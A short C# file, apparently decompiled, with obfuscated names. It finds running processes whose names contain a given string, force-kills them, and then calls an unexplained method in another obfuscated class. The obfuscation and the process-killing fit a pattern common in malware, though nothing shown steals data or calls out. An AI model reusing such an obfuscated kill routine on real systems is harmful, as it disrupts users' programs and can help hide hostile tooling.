using System;
using System.Diagnostics;

namespace bpbWYHKNCNX;

public sealed class NIQnFyIlhyvf
{
	public static bool LOgzPjsgEDOe(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void lJuPKSwijpjbs(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (LOgzPjsgEDOe(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					xWcMxnuhDQYJl.JCyivAFPoKMiI();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
